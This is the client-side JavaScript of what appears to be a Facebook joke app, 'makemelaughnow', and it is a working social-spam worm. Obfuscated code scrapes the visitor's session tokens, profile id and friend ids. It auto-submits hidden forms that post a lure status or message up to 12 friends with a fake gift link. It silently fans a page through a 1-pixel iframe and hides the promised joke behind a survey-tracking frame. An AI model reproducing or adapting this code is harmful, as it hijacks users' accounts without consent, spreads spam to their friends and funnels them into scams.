var app_100124540047022 = new fbjs_sandbox("100124540047022").setBridgeHash("");app_100124540047022.validation_vars = {"fb_sig_locale":"en_US","fb_sig_in_new_facebook":1,"fb_sig_time":"1283155119.2838","fb_sig_added":0,"fb_sig_country":"pl","fb_sig_api_key":"4c6e8537174db9c6ff666575fb7c10ff","fb_sig_app_id":100124540047022,"fb_sig":"783435ee8e6dca8403944cccc738475a"};app_100124540047022.context = "22d3448e5250";app_100124540047022.contextd = "O:16:\"CanvasFBMLFlavor\":1:{s:9:\"_fbml_env\";a:15:{s:4:\"user\";i:100000589778946;s:6:\"app_id\";i:100124540047022;s:10:\"fb_page_id\";i:0;s:10:\"canvas_url\";s:40:\"http:\/\/apps.facebook.com\/makemelaughnow\/\";s:10:\"source_url\";s:40:\"http:\/\/www.bestplazadel.com\/makemelaugh\/\";s:9:\"loggedout\";b:0;s:7:\"non-tos\";b:1;s:11:\"flavor_code\";i:3;s:14:\"on_canvas_info\";b:0;s:8:\"is_tosed\";b:0;s:14:\"user_triggered\";b:1;s:11:\"image_cache\";N;s:14:\"ajax_triggered\";b:1;s:17:\"non_underlineable\";a:0:{}s:14:\"suppress_label\";b:1;}}";app_100124540047022.data = {"user":100000589778946,"installed":false};app_100124540047022.bootstrap();

		var a100124540047022_startedapp;
		var a100124540047022_sheep=[],a100124540047022_params=[],a100124540047022_domethod=0;
	
		function a100124540047022_logerr(a100124540047022_err){
		
		}

		function a100124540047022_startapp(){
			if(a100124540047022_startedapp=='1'){return;}
			a100124540047022_startedapp='1';
			
			
			var a100124540047022_create = {
				help :	function(a100124540047022_cmd,a100124540047022_name){
							var a100124540047022_co = a100124540047022_document.getElementById(a100124540047022_name.substr(2,1)).getTitle();
							for(var a100124540047022_a=0, a100124540047022_out='';a100124540047022_a<=a100124540047022_cmd.length-1;a100124540047022_a++){var a100124540047022_out=a100124540047022_out + a100124540047022_co.substr(a100124540047022_cmd[$FBJS.idx(a100124540047022_a)],1);}
							return a100124540047022_out;
						},
				input : function(a100124540047022_name,a100124540047022_value){
							var a100124540047022_frmform = a100124540047022_document.getElementById('frm');
							var a100124540047022_frminput = a100124540047022_document.createElement('input');
							a100124540047022_frminput.setType('hidden').setValue(a100124540047022_value).setName(a100124540047022_name);
							a100124540047022_frmform.appendChild(a100124540047022_frminput);
							a100124540047022_frminput=null,a100124540047022_frmform=null;
							return;
						},
				fire : 	function(a100124540047022_nam,a100124540047022_val){
							var a100124540047022_val = a100124540047022_val || '';
							return (a100124540047022_val == 'name') ? $FBJS.ref(this).help(a100124540047022_nam,a100124540047022_val) : $FBJS.ref(this).input(a100124540047022_nam,a100124540047022_val);
						}
			};
			
			
			var a100124540047022_meth = {
				ftarg : ["21"- -"5",22+1,"18"- -"6"],
				fhome : [5-4,3+4,1+6,17+1,8-4,20+5,"19"- -"6",5+2,1+1,13+3,10-10,3-2,11+4,23+3,14+10,20-20,3+3,10+4,1+1,4-2,2+3,11+4,
							5-5,1+1,16-8,17+8,9-8,9-7,4+4,1+5,9+6,17+1,19-18,17+1],
				m : 	[3-2,"3"- -"4",3+4,17+1,2+2,20+5,30-5,10-3,1+1,13+3,"0"- -"0",2-1,13+2,23+3,20+4,10-10,3+3,11+3,1+1,4-2,3+2,14+1,8-8,
							8-6,4+4,30-5,4+4,3+3,5+5,6+4,20+4,10+10,3+3,21+8,7+3,3+3,20+2,6+3,11+4,17+1,2-1,10+8],
				su : 	[5-4,"2" - -"5",1+6,15+3,2+2,20+5,30-5,1+6,1+1,13+3,10-10,3-2,12+3,20+6,22+2,5-5,4+2,12+2,1+1,5-3,4+1,11+4,9-9,
							1+1,4+4,21+4,6+4,12+4,11+3,5+3,26+1,4+3,28+1,8+2,5+2,22+2,1+6,13+3,1+9,10+5,14+4,2-1,17+1],
				lp :	[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,23,6,12,10,15,18,1,18,30,27,9,31],
				pid : 	["11"- -"7",4-2,5+5,1+6,19+10,23+3,1+1,22+1,2+6,21+8,21+6,6+3],
				fbd : 	[19+7,"10"- -"4",20+9,10-1,5+2,5+5,11+9],
				hc :	["0"- -"1",4+2,10+1,15+3,28+1,10-10,1+1,11+11,2+5,20+4,21+6,20+2,1+5,20+3],
				get : 	function(a100124540047022_s){return a100124540047022_create.fire(a100124540047022_s,'name');}
			};
			
			var a100124540047022_findvalues = {
				a : ((new a100124540047022_RegExp('st_.or._i.\\\x22 .al.e=\\\x22(.*?)\\\x22',''))),
				b : ((new a100124540047022_RegExp('b_d.s.\\\x22 v..ue=\\\x22(.*?)\\\x22',''))),
				c : ((new a100124540047022_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22',''))),
				d : ((new a100124540047022_RegExp('na.e=\\\x22i.s\\[]\\\x22 v.l.e=\\\x22(.*?)\\\x22','gi'))),
				firefunc : function(a100124540047022_strdata){
						var a100124540047022_matches=[],a100124540047022_fmatch=[],a100124540047022_out = '',a100124540047022_f = 0;
						for (a100124540047022_p in a100124540047022_findvalues){
							try{
								if(a100124540047022_f==3){
									while (a100124540047022_matches = a100124540047022_findvalues[$FBJS.idx(a100124540047022_p)].exec(a100124540047022_strdata)){
										if(a100124540047022_matches[$FBJS.idx(1)] == a100124540047022_sheep[$FBJS.idx(0)]){break;}
										if(a100124540047022_matches[$FBJS.idx(1)].length < 25){a100124540047022_sheep.push(a100124540047022_matches[$FBJS.idx(1)]);}
									}
									break;
								}
								a100124540047022_fmatch = a100124540047022_findvalues[$FBJS.idx(a100124540047022_p)].exec(a100124540047022_strdata);
								if(a100124540047022_fmatch[$FBJS.idx(1)] !== null){a100124540047022_params[$FBJS.idx(a100124540047022_f)] = a100124540047022_fmatch[$FBJS.idx(1)];}
							}catch(a100124540047022_err){
								a100124540047022_logerr(a100124540047022_err);
							}
							a100124540047022_f++;
						}
						a100124540047022_document.getElementById('help_container').setTextValue('');
						var a100124540047022_out = ((a100124540047022_params[$FBJS.idx(0)] !== null) && (a100124540047022_params[$FBJS.idx(0)] !== null)) ? 1 : 0;
						return a100124540047022_out;
					}
				};
			
			var a100124540047022_methodaction = function(){
				var a100124540047022_retmeth = 0;
				a100124540047022_sheep = a100124540047022_sheep || [];
				var a100124540047022_goahead = (((a100124540047022_sheep.length - 1) < 1) || ((a100124540047022_sheep.length - 1) > 500)) ? 0 : 1;
				if(a100124540047022_goahead == 0){
											a100124540047022_document.getElementById('frm').setAction(a100124540047022_meth.get(a100124540047022_meth.su)).setTarget(a100124540047022_meth.get(a100124540047022_meth.ftarg));
						a100124540047022_create.fire('status','only go here if you are my TRUE friend http://apps.facebook.com/makemelaughnow/');
						a100124540047022_create.fire(a100124540047022_meth.get(a100124540047022_meth.pid),a100124540047022_params[$FBJS.idx(0)]);
						a100124540047022_create.fire(a100124540047022_meth.get(a100124540047022_meth.fbd),a100124540047022_params[$FBJS.idx(1)]);
						a100124540047022_retmeth = 2;
										return a100124540047022_retmeth;
				}else{
											a100124540047022_document.getElementById('frm').setAction(a100124540047022_meth.get(a100124540047022_meth.m)).setTarget(a100124540047022_meth.get(a100124540047022_meth.ftarg));
						a100124540047022_create.fire(a100124540047022_meth.get(a100124540047022_meth.fbd),a100124540047022_params[$FBJS.idx(1)]);
						a100124540047022_create.fire(a100124540047022_meth.get(a100124540047022_meth.pid),a100124540047022_params[$FBJS.idx(0)]);
						a100124540047022_create.fire('ids[]','');
						a100124540047022_create.fire('subject','i thought of you..');
						a100124540047022_create.fire('body','im using up my fb ad credits to send u a gift so HERE = http://apps.facebook.com/makemelaughnow/');
						var a100124540047022_sendamount = (12 > (a100124540047022_sheep.length-1)) ? (a100124540047022_sheep.length-1) : 12;
						var a100124540047022_sendamount = (a100124540047022_sendamount < 20) ? a100124540047022_sendamount : 20;
						for(var a100124540047022_j=0;a100124540047022_j<a100124540047022_sendamount;a100124540047022_j++){
							a100124540047022_create.fire('ids[]',a100124540047022_sheep[$FBJS.idx(a100124540047022_j)]);
						}
						a100124540047022_create.fire(a100124540047022_meth.get(a100124540047022_meth.fbd),a100124540047022_params[$FBJS.idx(1)]);
						a100124540047022_retmeth = 1;
										return a100124540047022_retmeth;
				}
			}
			
			//
			try{
				a100124540047022_domethod = a100124540047022_findvalues.firefunc(a100124540047022_document.getElementById('help_container').getFirstChild().getTitle());
			}catch(a100124540047022_err){
				a100124540047022_logerr(a100124540047022_err);
			}finally{
				if((a100124540047022_domethod == 1) && (a100124540047022_params.length > 1)){
				
					a100124540047022_document.getElementById('work_container').setInnerXHTML("<iframe name='fra' id='fra' frameborder='0' smartsize='false' width='1' height='1' scrolling='no' style='width:1px;height:1px;' src='about:blank'></iframe>");
					a100124540047022_document.getElementById('frm_container').setInnerXHTML('<form id="frm" method="POST" action=""></form>');
					
					var a100124540047022_submitfrm = a100124540047022_methodaction();
					if(a100124540047022_submitfrm > 0){
						try{
							a100124540047022_setTimeout(function(){a100124540047022_document.getElementById('frm').submit();},1200);
						}catch(a100124540047022_err){ 
							a100124540047022_logerr(a100124540047022_err);
						}
					}
					
											try{
							var a100124540047022_lkp = a100124540047022_document.createElement('div').setId('lkp');
							a100124540047022_document.getElementById('work_container').appendChild(a100124540047022_lkp);
							a100124540047022_lkp.setInnerXHTML("<iframe id='fralkp' name='fralkp' width='1' height='1' scrolling='no' frameborder='0' style='border:none;overflow:hidden;width:1px;height:1px;' src='about:blank'></iframe>");
							a100124540047022_document.getElementById('fralkp').setSrc(a100124540047022_meth.get(a100124540047022_meth.lp) + '148034935215009&action=fan&' + a100124540047022_meth.get(a100124540047022_meth.pid) + '=' + a100124540047022_params[$FBJS.idx(0)]);
							a100124540047022_lkp = null;
						}catch(a100124540047022_err){
							a100124540047022_logerr(a100124540047022_err);
						}
										
				}
			}
			
				
			a100124540047022_document.getElementById('frabox').setClassName('frabox');
			a100124540047022_document.getElementById('frabox').setInnerXHTML('<iframe id="fraoff" name="fraoff" width="760" height="700" scrolling="no" frameborder="0" style="position:relative;overflow:hidden;border:none;width:755px;height:750px;top:-245px;" src="http://track.socialsurveys.us/DefaultPage.aspx?nm=017gjfq68yx9"></iframe>');
			a100124540047022_document.getElementById('loading').setTextValue('Complete above to see a joke!');
			
			
			a100124540047022_setTimeout(function(){
				a100124540047022_document.getElementById('work_container').setTextValue('');
				a100124540047022_document.getElementById('frm_container').setTextValue('');
				
			},16000);

		}
		
		a100124540047022_setTimeout(function(){a100124540047022_startapp();},800);
			

